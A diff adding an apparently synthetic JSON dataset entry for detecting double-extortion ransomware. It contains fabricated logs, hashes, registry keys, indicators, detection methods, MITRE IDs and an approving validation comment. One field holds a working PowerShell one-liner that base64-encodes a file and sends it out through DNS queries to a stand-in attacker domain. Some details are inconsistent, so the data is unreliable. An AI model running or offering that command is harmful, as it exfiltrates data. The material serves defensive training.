@@ -1,0 +1,69 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Ransomware",
+        "nature": "double_extortion"
+      },
+      "example": {
+        "scenario": "Double Extortion Ransomware attack involving data encryption and sensitive data exfiltration via DNS tunneling.",
+        "technical_data": {
+          "network_traffic": {
+            "dns_query_sample": "22:14:15.123456 IP 192.168.1.101.55555 > ns1.example.com.53: 12345+ A? f1a2b3c4d5e6f7g8h9i0.j4x2z9.a1b2c3d4.evilcorp.com. (60)",
+            "dns_response_sample": "22:14:15.124567 IP ns1.example.com.53 > 192.168.1.101.55555: 12345 1/0/0 A 192.0.2.123 (76)",
+            "exfiltration_pattern": "Repeated DNS TXT queries with base64-encoded chunks resembling exfiltrated data: 'dGhpcyBpcyBhIHRlc3QgY2h1bms='",
+            "http_post_request": "POST /api/v1/upload HTTP/1.1\r\nHost: victim.company.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 3487\r\n\r\n[ENCRYPTED PAYLOAD BINARY DATA]",
+            "packet_capture_excerpt": "Frame 3421: 1500 bytes on wire (12000 bits), 1500 bytes captured (12000 bits)\nEthernet II, Src: 00:0c:29:3e:5b:7f, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.101, Dst: 198.51.100.25\nTransmission Control Protocol, Src Port: 55555, Dst Port: 443, Seq: 3456721, Ack: 2345678, Len: 1460\nEncrypted TLS Application Data"
+          },
+          "logs": {
+            "firewall_log": "Apr 26 22:14:15 firewall1 kernel: IN=eth0 OUT= MAC=00:0c:29:3e:5b:7f:00:50:56:c0:00:08:08:00 SRC=192.168.1.101 DST=198.51.100.25 LEN=1500 TOS=0x00 PREC=0x00 TTL=64 ID=54321 DF PROTO=TCP SPT=55555 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0",
+            "dns_server_log": "26-Apr-2024 22:14:15.123 client @0x7f9d8a0: 192.168.1.101#55555 (f1a2b3c4d5e6f7g8h9i0.j4x2z9.a1b2c3d4.evilcorp.com): query: f1a2b3c4d5e6f7g8h9i0.j4x2z9.a1b2c3d4.evilcorp.com IN A -EDC (192.0.2.1)",
+            "sysmon_event": "EventID: 3 | SourceImage: C:\\Windows\\System32\\dns.exe | DestinationHostname: evilcorp.com | SourcePort: 55555 | DestinationPort: 53 | Protocol: UDP",
+            "endpoint_log": "2024-04-26T22:14:16Z [INFO] Ransomware encryption started on directory C:\\Users\\victim\\Documents\\SensitiveData"
+          },
+          "file_hashes": {
+            "ransomware_binary": {
+              "md5": "3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6d",
+              "sha1": "9d5c7a8e4f2b3c1e6d0f9a7b8c1d2e3f4a5b6c7d",
+              "sha256": "a3b2c1d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"
+            }
+          },
+          "registry_changes": [
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil_ransomware = C:\\Users\\victim\\AppData\\Local\\Temp\\ransom.exe",
+            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNSCache\\Parameters\\MaxCacheTtl = 0"
+          ],
+          "process_creation": [
+            "2024-04-26T22:13:50Z - Process Start: C:\\Users\\victim\\AppData\\Local\\Temp\\ransom.exe -encrypt",
+            "Parent Process: powershell.exe (PID 4521)",
+            "Child Processes: cipher.exe (PID 4782) - used for file encryption"
+          ],
+          "exfiltration_command_snippet": "powershell -NoProfile -Command \"$data = Get-Content -Path 'C:\\Users\\victim\\Documents\\SensitiveData\\confidential.csv' -Encoding Byte; $encoded = [Convert]::ToBase64String($data); for ($i=0; $i -lt $encoded.Length; $i+=50) { $chunk = $encoded.Substring($i, [Math]::Min(50, $encoded.Length - $i)); nslookup \"$chunk.exfil.evilcorp.com\" }\""
+        },
+        "indicators": [
+          "Repeated DNS TXT/A queries with suspicious subdomains to evilcorp.com",
+          "Unusual PowerShell invocation with base64 encoding and DNS queries",
+          "Presence of ransom.exe in temp directory with auto-start registry key",
+          "Firewall logs showing outbound connections on high source ports to suspicious IP 198.51.100.25",
+          "Sysmon network connection events to unknown external domains on port 53 UDP",
+          "File hashes matching known ransomware samples",
+          "Modified MaxCacheTtl registry key to evade DNS caching"
+        ],
+        "detection_method": "Monitor DNS logs for unusual high-frequency queries to uncommon domains with encoded subdomains; detect PowerShell commands invoking DNS queries with base64 payloads; endpoint detection for new autorun entries linked to suspicious executables; network IDS rules to flag outbound connections to known malicious IPs and domains; heuristic detection of ransomware file encryption activity by monitoring rapid file modification patterns.",
+        "relevant_mitre_techniques": [
+          "T1486 - Data Encrypted for Impact",
+          "T1537 - Transfer Data to Cloud Account",
+          "T1041 - Exfiltration Over C2 Channel",
+          "T1071.004 - Application Layer Protocol: DNS",
+          "T1059.001 - PowerShell",
+          "T1112 - Modify Registry"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a double extortion ransomware scenario where attackers both encrypt victim data and exfiltrate sensitive information. The scenario description clearly states the use of DNS tunneling for exfiltration, aligning well with the problem nature. The technical data is comprehensive and realistic, including network traffic samples (DNS queries/responses, HTTP POST with encrypted payload), logs from firewall, DNS server, Sysmon, and endpoint showing ransomware activity, file hashes for malware identification, registry changes indicating persistence and evasion, process creation details, and a PowerShell command snippet demonstrating data exfiltration via DNS queries. The indicators section effectively highlights key signs that match the double extortion pattern, such as suspicious DNS queries, PowerShell usage, autorun registry keys, outbound connections to malicious IPs, and file hashes. The detection methods are well-aligned with the risk reduction strategies, focusing on monitoring DNS logs, PowerShell commands, endpoint autorun entries, network IDS, and ransomware file activity. Relevant MITRE ATT&CK techniques are correctly identified and cover encryption, data exfiltration, DNS tunneling, PowerShell usage, and registry modifications. Overall, the sample is complete, realistic, and correctly aligned with the stated problem, providing a strong example for detection and mitigation of double extortion ransomware attacks."
+      }
+    }
+  ]
+}
